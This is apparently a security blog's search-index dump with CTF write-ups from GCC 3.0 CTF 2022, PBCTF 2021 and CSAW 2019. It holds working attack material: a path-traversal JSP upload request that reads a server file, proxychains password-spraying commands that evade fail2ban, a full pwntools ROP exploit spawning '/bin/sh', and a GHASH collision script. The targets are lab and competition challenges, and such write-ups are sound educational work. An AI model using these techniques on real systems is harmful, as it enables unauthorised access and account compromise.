strstr(local_1038,\"frida\"), pcVar3 == (char *)0x0) ); bVar2 = true; if (__stream != (FILE *)0x0) { LAB_001009f1: bVar1 = bVar2; fclose(__stream); } LAB_001009f9: if (!bVar1) { idx = 0; curr_char_pass = (*(*env)-\u003eGetIntArrayElements)(env,password,(jboolean *)0x0); for (_expected_char = \u0026DAT_00100c8c; ((new_arr5 = new_arr, ((\u0026DAT_00100b20)[idx] ^ *(uint *)((long)curr_char_pass + idx * 4) ^ *_expected_char) == (\u0026DAT_00100cc0)[idx] \u0026\u0026 (new_arr5 = password, idx != 26)) \u0026\u0026 (new_arr5 = new_arr, ((\u0026DAT_00100b24)[idx] ^ *(uint *)((long)curr_char_pass + idx * 4 + 4) ^ _expected_char[-1] ) == (\u0026DAT_00100cc4)[idx])); _expected_char = _expected_char + -2) { idx = idx + 2; } } } if (*(long *)(in_FS_OFFSET + 0x28) != local_38) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return new_arr5; } Reading the code, we know that the password length is 27, and the native lib have three different keys in the native (key_a which is DAT_00100b20, key_b which is DAT_00100c8c and key_c which is DAT_00100cc0 ). What it do is input[i] ^ key_a[i] ^ key_b[-i] = key_c[i] And merging with the Login logic, the final operation would be password[i] ^ x0[i] ^ key_a[i] ^ key_b[-i] = key_c[i] So to generate the password (which is the flag), we just need to do: password[i] = x0[i] ^ key_a[i] ^ key_b[-i] ^ key_c[i] Full code: key_a = b'\\xd0\\x45\\x28\\x76\\x6f\\xf3\\x5a\\xf4\\xc7\\xce\\xfb\\xc3\\x7f\\x48\\xce\\x3c\\x3a\\x0b\\xf1\\x53\\xb1\\x4b\\xb9\\x5e\\xa2\\x65\\x77' key_b = b'\\x4c\\x7b\\x73\\x6f\\x72\\x72\\x79\\x2e\\x74\\x68\\x69\\x73\\x2e\\x69\\x73\\x2e\\x4e\\x4f\\x54\\x2e\\x74\\x68\\x65\\x2e\\x66\\x6c\\x61' key_c = b'\\x80\\xe3\\xda\\xc7\\x2e\\xf1\\xa2\\x91\\x6b","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:6:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"PLUpload I try to check /examples folder, and found out that this uses Apache Tomcat. After playing it for a while (especially on the upload feature), I notice that the upload feature doesn’t sanitize ../, which mean we can freely upload the file to any directories. Also inside the examples folder there are a lot of jsp file example that got executed. My solution is to upload a jsp file to the examples folder path (/examples/jsp/jsp2/el) where the jsp file will open /var/gold.txt file contents. Below is the jsp file \u003c%@page import=\"java.io.FileInputStream\"%\u003e \u003c%@page import=\"java.io.File\"%\u003e \u003c%@page import=\"java.io.InputStreamReader\"%\u003e \u003c%@page import=\"java.net.URL\"%\u003e \u003c%@page import=\"java.io.FileReader\"%\u003e \u003c%@page import=\"java.io.BufferedReader\"%\u003e \u003c%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eRead Text\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c% String txtFilePath = \"/var/gold.txt\"; BufferedReader reader = new BufferedReader(new FileReader(txtFilePath)); StringBuilder sb = new StringBuilder(); String line; while((line = reader.readLine())!= null){ sb.append(line+\"\\n\"); } out.println(sb.toString()); %\u003e \u003c/body\u003e \u003c/html\u003e Below is the upload request that I use to upload the jsp file to ../../examples/jsp/jsp2/el/cho.jsp POST //upload HTTP/1.1 Host: e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------34999802810414628822789368601 Content-Length: 1479 Origin: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land Connection: close Referer: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land/ Cookie: JSESSIONID=6E2119D7A2763AC0C88B4888A10C0E8B Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"name\" ../../examples/jsp/jsp2/el/cho.jsp -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"chunk\" 0 -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"chunks\" 1 -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"file\"; filename=\"cho.jsp\" Content-Type: application/octet-stream \u003c%@page import=\"java.io.FileInputStream\"%\u003e \u003c%@page import=\"java.io.File\"%\u003e \u003c%@page import=\"java.io.InputStreamReader\"%\u003e \u003c%@page import=\"java.net.URL\"%\u003e \u003c%@page import=\"java.io.FileReader\"%\u003e \u003c%@page import=\"java.io.BufferedReader\"%\u003e \u003c%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eRead Text\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c% String txtFilePath = \"/var/gold.txt\"; BufferedReader reader = new BufferedReader(new FileReader(txtFilePath)); StringBuilder sb = new StringBuilder(); String line; while((line = reader.readLine())!= null){ sb.append(line+\"\\n\"); } out.println(sb.toString()); %\u003e \u003c/body\u003e \u003c/html\u003e -----------------------------34999802810414628822789368601-- After upload it, we can simply open the file Flag: New is always better. - Barney Stinson Misc ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:7:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"CTF Spray Attack SSH With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used: proxychains sshpass -p 93370760 ssh -o StrictHostKeyChecking=no user_100283@pwspray.vm.vuln.land -p 22 ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:8:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"CTF Spray Attack HTTP With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used: proxychains curl --user user_140244:6ed42dd7 http://pwspray.vm.vuln.land -v Pwn ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:9:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"CrySYS We were given a binary that is pretty short #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e //gcc -o challenge -no-pie -fno-stack-protector challenges.c //LD_PRELOAD=./libc-2.27.so ./ld-2.27.so ./challenge int not_vulnerable(){ char buf[80]; return read(0, buf, 0x1000); } int main(){ not_vulnerable(); return 0; } There is a buffer overflow vulnerability. Because the plt only contains read, we need to do partial overwrite (1 byte) to the read_got value so that we can execute syscall. The idea to gain the shell is: Overwrite RIP to read_plt Overwrite read_got to syscall with read (1 last byte) Rax = 1, If we call read_plt (which now is syscall), we can leak the got address and retrieve the libc base address Set rax to 0 Syscall read again to load our second payload into .bss (Second payload will execute system(\"/bin/sh\")) Set rsp to the .bss Pop “/bin/sh” to rdi Ret to system Below is my full payload from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # Chosen BSS bss = 0x00601030+0x400 # readelf -s libc-2.27.so | grep \"read\" = 0x0000000000110070 # I choose to redirect it to directly syscall inside read (read+15) read_offset = 0x000000000011007f read_plt = 0x00000000004003f0 read_got = 0x601018 syscall = read_plt # We will overwrite read_got to syscall, so basically syscall = read_plt # ROPGadget result pop_rdi = 0x0000000000400583 # pop rdi ; ret pop_rsi_r15 = 0x0000000000400581 # pop rsi ; pop r15 ; ret pop_rsp = 0x000000000040057d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret mov_eax_0_pop_rbp = 0x0000000000400515 # mov eax, 0 ; pop rbp ; ret ret_address = 0x00000000004003de # ret libc = ELF('./libc-2.27.so') r = process('./crySYS_patched') # Load stage 2 rop payload = b'a'*80 payload += p64(bss) payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) payload += p64(read_plt) # Overwrite 1 bytes, rax == 1 payload += p64(pop_rdi) + p64(1) payload += p64(syscall) # rax == 1 == write(1, got_addr) payload += p64(mov_eax_0_pop_rbp) + p64(bss+72) # Set rax to 0 payload += p64(pop_rdi) + p64(0) payload += p64(pop_rsi_r15) + p64(bss) + p64(0) payload += p64(syscall) # read(0, bss) payload += p64(pop_rsp) + p64(bss) # Set rsp to bss sleep(1) r.sendline(payload) log.info('Payload sent...') sleep(1) # Overwrite 1 byte of read_got by syscall inside read r.send(b'\\x7f') log.info('Overwrite read got...') sleep(1) # After leaking the address, call system() leak_syscall_address = u64(r.recvn(8)) libc.address = leak_syscall_address - read_offset log.info(f'Leaked syscall address: {hex(leak_syscall_address)}') log.info(f'Leaked libc address: {hex(libc.address)}') # Craft payload to call system('/bin/sh') bin_sh_string_addr = next(libc.search(b'/bin/sh')) payload_3 = p64(0) + p64(0) + p64(0) payload_3 += p64(pop_rdi) + p64(bin_sh_string_addr) payload_3 += p64(ret_address) # https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call payload_3 += p64(libc.symbols['system']) + p64(0) # Call system sleep(1) r.send(payload_3) log.info('Call system(\"/bin/sh\")...') r.interactive() Flag: HL{PPPwned-7165-4679-8c39-cf7633bdf81b} Crypto ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:10:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"IDBased1 After checking with the given ciphertexts consist of encrypted message of ‘This is the test message number x’, there is a collision between the ciphertexts CEO and the test ciphertexts CEO ciphertexts: (48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v One of the test ciphertexts: (48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc BasicIdent ciphertext is like below: v = m xor H2(gID**r) Because the $rP$ value is the same, we could know that the $H2(g_{ID}^r)$ value of the ceo and the test cipher texts have the same value, which mean ceo_v = b64decode('4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v') test_v = b64decode('7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc') ceo_msg = test_v^b'This is the message number'^ceo_v Full Script: from pwn import * import base64 ceo_v = base64.b64decode('4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v') flag_len = len(ceo_v) test_v = base64.b64decode('7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc') test_msg = b'This is the test message number' flag = xor(xor(test_v[:flag_len], test_msg[:flag_len]), ceo_v) print(f'Flag: {flag.decode()}') We successfully retrieve the flag Flag: YNOT18{B4DB4DB4DR4NDOMNE55} Social Media Follow me on twitter ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:11:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"This CTF marked the start of my journey on preparing myself to convert my role from Software Engineer to Security Engineer for the next 4 years. I’ve taken a break from CTF since I graduated from my college. On this CTF, I managed to solve 2 Crypto Challenge Alkoloid Stream (134 pts) GoodHash (218 pts) Today, I will explain my solution on solving the GoodHash. Crypto ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:0:0","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"GoodHash (218 pts) I think I made a good hash function based on AES. Could you test this? nc good-hash.chal.perfect.blue 1337 Author: rbtree file: main.py ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:0","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"Source Code #!/usr/bin/env python3 from Crypto.Cipher import AES from Crypto.Util.number import * from flag import flag import json import os import string ACCEPTABLE = string.ascii_letters + string.digits + string.punctuation + \" \" class GoodHash: def __init__(self, v=b\"\"): self.key = b\"goodhashGOODHASH\" self.buf = v def update(self, v): self.buf += v def digest(self): cipher = AES.new(self.key, AES.MODE_GCM, nonce=self.buf) enc, tag = cipher.encrypt_and_digest(b\"\\0\" * 32) return enc + tag def hexdigest(self): return self.digest().hex() if __name__ == \"__main__\": token = json.dumps({\"token\": os.urandom(16).hex(), \"admin\": False}) token_hash = GoodHash(token.encode()).hexdigest() print(f\"Body: {token}\") print(f\"Hash: {token_hash}\") inp = input(\"\u003e \") if len(inp) \u003e 64 or any(v not in ACCEPTABLE for v in inp): print(\"Invalid input :(\") exit(0) inp_hash = GoodHash(inp.encode()).hexdigest() if token_hash == inp_hash: try: token = json.loads(inp) if token[\"admin\"] == True: print(\"Wow, how did you find a collision?\") print(f\"Here's the flag: {flag}\") else: print(\"Nice try.\") print(\"Now you need to set the admin value to True\") except: print(\"Invalid input :(\") else: print(\"Invalid input :(\") ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:1","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"Analysis General key points I really love this challenge, because I learn a lot of new things during taking my time to solve this challenge. After I read the source code, some key notes that we could infer: It use AES-GCM It give us the encryption key goodhashGOODHASH It require us to find a hash collision with some constraints: The message should be in json format The message should only contains characters from the ACCEPTABLE variable The message will need to contain \"admin\": true if we want to get the flag Our input is actually being used as the AES-GCM nonce, not as the plaintext. If you read the source code, the plaintext message always \\0*32 Check digest method After reading many articles in the internet about AES-GCM, below is the encryption scheme. Further analysis: If you notice, because our plaintext is always 0, we can safely ignore the plaintext and just focus on the nonce (because if you see the image pt1^Ek(Counter 1) = Ek(Counter 1) because of null plaintext) Turns out, the recommended nonce length for AES-GCM is 96 bits (12 bytes), so that the first block of encryption will be iv||counter, where iv is 12 bytes and counter is 4 bytes. If the nonce length is not 96 bit (whether shorter or longer), the nonce will be hashed by using the GHASH algorithm. Reading the source code, we know that the targeted input ('{\"token\":\"xxx\", \"admin\": false}') and our input length will always be longer than 12 bytes, which mean our nonce will be always hashed by GHASH method. (This is important note) GHASH Explained For detailed info, you can read wiki, but I’ll try to explain it. Defined as GHASH(H,A,C), it requires 3 inputs: H: The secret key, calculated by Ek(’\\0’*16) A: Associated data C: Message that we want to authenticate GHASH Pseudocode: ---------------------------------------------- x = bytes(16) # Initialize x with 16 bytes of 0 padded_a = pad(a) # Append extra '\\x00' until the size is divisible by 16 padded_c = pad(c) # Append extra '\\x00' until the size is divisible by 16 for i in range(0,len(padded_a),16): x = xor(x, padded_a[i:i+16])•H for i in range(0,len(padded_c),16): x = xor(x, padded_c[i:i+16])•H # Notes: # conv is illustration function that will convert integer to 16 bytes representation # Example: # 1 -\u003e b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01' # 8 -\u003e b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08' # 11 -\u003e b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b' return xor(x, conv(len(padded_a)+len(padded_c)))•H Notes: The multiplication of xor(x1,x2)•H is happen on $GF(2^{128})$ defined by polynomial $$Poly=x^{128}+x^7+x^2+x+1$$ Vulnerability So, if you read the source code, you can see that: Our input is limited to 64 Target hash is created from nonce {\"token: \"xxxxxxxxxxxxxxxx\", \"admin\": false}, which length is 61. I’ve explained above that if the nonce is not equal to 92 bit, by default AES-GCM will GHASH the nonce. Let’s try to simulate it: Let say that the nonce is {\"token: \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\", \"admin\": false}. Length is 61 AES-GCM will call GHASH(H,bytes(),nonce) (without any associated data) GHASH will pad the nonce and split it per 16 bytes. block_1 = '{\"token\": \"xxxxx' block_2 = 'xxxxxxxxxxxxxxxx' block_3 = 'xxxxxxxxxxx\", \"a' block_4 = 'dmin\": false}\\x00\\x00\\x00' GHASH will initialize x with 16 bytes of \\x00. final_x will be used as the AES-GCM first block input (substitute of iv||counter) x0 = '\\x00'*16 x1 = xor(x0, block_1)•H x2 = xor(x1, block_2)•H x3 = xor(x2, block_3)•H x4 = xor(x3, block_4)•H final_x = xor(x4, ('\\x00'*15 + '\\x3d'))•H # \\x3d is nonce length representation in bytes, \\x3d == 61 After this, the AES-GCM will start and give the encrypted+tag The vulnerability of this code is we know the secret key H. Because we know the secret, we can do preimage attack. Consider the below equation, which is how GHASH works: $$x_i=(x_{i−1}⊕A_i)⋅H$$ where A is the input that we control. If we know state $x_i$, and we want the next state $x_{i+1}$ equals to let say $P$ $$𝑃=x_{𝑖+1}=(x_𝑖⊕A_{𝑖+1})⋅𝐻$$ We can get the correct $A","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:2","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"Solution So, here is my full solution. from Crypto.Util.number import * from Crypto.Cipher import AES from multiprocessing import Process import random acceptable = string.ascii_letters + string.digits + '!#$%\u0026()*+,-.:;\u003c=\u003e?@[]^_`|~ ' key = b'goodhashGOODHASH' def tobin(x, n): x = Integer(x) nbits = x.nbits() assert nbits \u003c= n return [0] * (n - nbits) + x.bits()[::-1] def frombin(v): return int(\"\".join(map(str, v)), 2 ) X = GF(2).polynomial_ring().gen() poly = X**128 + X**7 + X**2 + X**1 + 1 F = GF(2**128, name='a', modulus=poly) def toF(x): # Little endian, so need bit reverse x = frombin(tobin(x, 128)[::-1]) return F.fetch_int(x) def fromF(x): # Little endian, so need bit reverse x = x.integer_representation() x = frombin(tobin(x, 128)[::-1]) return x def field_mult(a, b): return fromF(toF(a) * toF(b)) def rand_str(): global acceptable n = 16 return ''.join(random.choice(acceptable) for _ in range(n)).encode() # Calculate H and H^-1 ex = False Ek = AES.new(key, AES.MODE_ECB) hkey = Ek.encrypt(b'\\x00'*(16)) h = bytes_to_long(hkey) inverse_h = fromF(toF(h)^-1) target_json = b'{\"token\": \"a617eb720dd41c256119c8b8e64d50d1\", \"admin\": false}' padded_target_json = target_json + b'\\x00'*((16-len(target_json)%16)%16) target_x = [0] # initialize with 0 for i in range(0, len(padded_target_json), 16): block = padded_target_json[i:i+16] x = field_mult(target_x[-1]^^bytes_to_long(block), h) target_x.append(x) def solve(): global target_x global h global inverse_h global target_json # Craft payload new_x = [0] new_block1 = b'{\"admin\":true, \"' new_x.append(field_mult(new_x[-1]^^bytes_to_long(new_block1), h)) while True: new_block2 = rand_str() new_x2 = field_mult(new_x[-1]^^bytes_to_long(new_block2), h) new_block3 = long_to_bytes(field_mult(target_x[3], inverse_h)^^new_x2) # print new_block1+new_block2+new_block3+target_json[48:], target_x[3] == field_mult(new_x2^^bytes_to_long(new_block3), h) if not any(v not in acceptable.encode() for v in new_block3): payload = new_block1+new_block2+new_block3+target_json[48:] print('[+] Payload:', payload) exit() def finds(): global ex while True: if ex: break solve() if __name__ == '__main__': proc = [] for _ in range(6): p = Process(target=finds) p.start() proc.append(p) input() ex = True for p in proc: p.join() Running the code will give you this Putting one of the found payloads will give you the flag Flag: pbctf{GHASH_is_short_for_GoodHash_😂} ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:3","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"References StackExchange question about preimage attack on GHASH AES-GCM Implementation Wikipedia about AES-GCM MSLC Writeup about GCM (which I reuse some of their codes. Thanks) Social Media Follow me on Twitter ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:4","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"I’m going to explain my writeup for some challenges that I have done in this year CSAW CTF. Crypto ","date":"Sep 16, 2019","objectID":"/posts/csaw-ctf-2019/:0:0","tags":["Writeup","CSAW CTF","crypto","rsa","2019"],"title":"CSAW CTF 2019","uri":"/posts/csaw-ctf-2019/"},{"categories":null,"content":"Fault Box Below is the given chall import socketserver import random import signal import time import gmpy2 from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes FLAG = open('flag', 'r').read().strip() def s2n(s): return bytes_to_long(bytearray(s, 'latin-1')) def n2s(n): return long_to_bytes(n).decode('latin-1') def gen_prime(): base = random.getrandbits(1024) off = 0 while True: if gmpy2.is_prime(base + off): break off += 1 p = base + off return p, off class RSA(object): def __init__(self): pass def generate(self, p, q, e=0x10001): self.p = p self.q = q self.N = p * q self.e = e phi = (p-1) * (q-1) self.d = inverse(e, phi) def encrypt(self, p): return pow(p, self.e, self.N) def decrypt(self, c): return pow(c, self.d, self.N) # ===== FUNCTIONS FOR PERSONAL TESTS, DON'T USE THEM ===== def TEST_CRT_encrypt(self, p, fun=0): ep = inverse(self.d, self.p-1) eq = inverse(self.d, self.q-1) qinv = inverse(self.q, self.p) c1 = pow(p, ep, self.p) c2 = pow(p, eq, self.q) ^ fun h = (qinv * (c1 - c2)) % self.p c = c2 + h*self.q return c def TEST_CRT_decrypt(self, c, fun=0): dp = inverse(self.e, self.p-1) dq = inverse(self.e, self.q-1) qinv = inverse(self.q, self.p) m1 = pow(c, dp, self.p) m2 = pow(c, dq, self.q) ^ fun h = (qinv * (m1 - m2)) % self.p m = m2 + h*self.q return m def go(req): r = RSA() p, x = gen_prime() q, y = gen_prime() r.generate(p, q) fake_flag = 'fake_flag{%s}' % (('%X' % y).rjust(32, '0')) def enc_flag(): req.sendall(b'%X\\n' % r.encrypt(s2n(FLAG))) def enc_fake_flag(): req.sendall(b'%X\\n' % r.encrypt(s2n(fake_flag))) def enc_fake_flag_TEST(): req.sendall(b'%X\\n' % r.TEST_CRT_encrypt(s2n(fake_flag), x)) def enc_msg(): req.sendall(b'input the data:') p = str(req.recv(4096).strip(), 'utf-8') req.sendall(b'%X\\n' % r.encrypt(s2n(p))) menu = { '1': enc_flag, '2': enc_fake_flag, '3': enc_fake_flag_TEST, '4': enc_msg, } cnt = 2 while cnt \u003e 0: req.sendall(bytes( '====================================\\n' ' fault box\\n' '====================================\\n' '1. print encrypted flag\\n' '2. print encrypted fake flag\\n' '3. print encrypted fake flag (TEST)\\n' '4. encrypt\\n' '====================================\\n', 'utf-8')) choice = str(req.recv(2).strip(), 'utf-8') if choice not in menu: exit(1) menu[choice]() if choice == '4': continue cnt -= 1 class incoming(socketserver.BaseRequestHandler): def handle(self): signal.alarm(300) random.seed(time.time()) req = self.request while True: go(req) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\"0.0.0.0\", 23333), incoming) server.serve_forever() When I try to connect to the service, I was greeted by this message. ==================================== fault box ==================================== 1. print encrypted flag 2. print encrypted fake flag 3. print encrypted fake flag (TEST) 4. encrypt ==================================== So basically, we need to enter our chosen menu, and the service will return the encrypted message. For menu 1, the service will return the encrypted flag (the one that we need to decrypt), menu 2 will return the encrypted fake_flag, menu 3 will return the encrypted fake_flag also, but with different method (CRT), menu 4 will ask us for an input, and they will return the encrypted message. Let’s check the problem challenge code. cnt = 2 while cnt \u003e 0: req.sendall(bytes( '====================================\\n' ' fault box\\n' '====================================\\n' '1. print encrypted flag\\n' '2. print encrypted fake flag\\n' '3. print encrypted fake flag (TEST)\\n' '4. encrypt\\n' '====================================\\n', 'utf-8')) choice = str(req.recv(2).strip(), 'utf-8') if choice not in menu: exit(1) menu[choice]() if choice == '4': continue cnt -= 1 After examining for a while, this challenge only give us the $e$ value, which is $0x10001$. Not only that, the challenge give us chance to encrypt as many message as we can using the fourth","date":"Sep 16, 2019","objectID":"/posts/csaw-ctf-2019/:1:0","tags":["Writeup","CSAW CTF","crypto","rsa","2019"],"title":"CSAW CTF 2019","uri":"/posts/csaw-ctf-2019/"},{"categories":null,"content":" Who am I? I am an Ex-SWE who is trying to find a way to move into Security fields. I’ve resigned from my SWE full-time job on January 2023 to self-study everything about security. What am I doing now? I’m currently learning everything about security via CTF (I’m part of the Water Paddler team). Usually, during the weekdays, I study past CTF challenges and read a lot of security articles, books, etc. While on the weekend, I participate in the active CTFs with my CTF team. Favorite Categories Pwn and Crypto. Open to Work You can contact me via Twitter or Email if you have a good opportunity for me related to security jobs. ","date":"Jan 01, 2019","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]